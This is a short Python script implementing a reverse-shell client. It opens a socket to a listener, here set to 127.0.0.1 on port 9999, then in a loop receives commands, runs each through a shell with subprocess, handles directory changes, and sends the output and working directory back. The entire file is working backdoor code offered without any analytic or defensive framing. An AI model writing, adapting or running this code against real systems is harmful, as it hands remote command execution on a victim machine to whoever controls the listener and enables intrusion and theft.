import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '127.0.0.1'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024).decode()
    if data[:2] == 'cd':
        os.chdir(data[3:])
    if len(data) > 0:
        cmd = subprocess.Popen(data, stdout= subprocess.PIPE, stdin= subprocess.PIPE, stderr= subprocess.PIPE,shell=True)
        outputByte = cmd.stdout.read() + cmd.stderr.read()
        outputText = outputByte.decode()
        s.send(str.encode(outputText + str(os.getcwd()) + '> '))
        print(outputText)



s.close()